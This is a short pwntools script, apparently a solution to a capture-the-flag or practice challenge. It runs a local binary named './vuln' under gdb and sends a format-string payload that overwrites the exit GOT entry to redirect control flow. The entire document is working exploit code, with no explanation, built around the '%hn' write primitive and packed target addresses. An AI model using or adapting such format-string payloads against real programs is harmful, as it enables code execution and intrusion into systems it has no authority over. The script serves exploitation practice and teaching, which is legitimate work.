from pwn import *

io = process('./vuln')
exe = ELF('./vuln')
context.arch = 'amd64'
gdb.attach(io, api=True)

exit_got = 0x404030


payload = b'%64p%10$hn%4438p%9$hn---' + p64(exit_got) + p64(exit_got + 2)
print(payload)
io.sendline(payload)
io.interactive()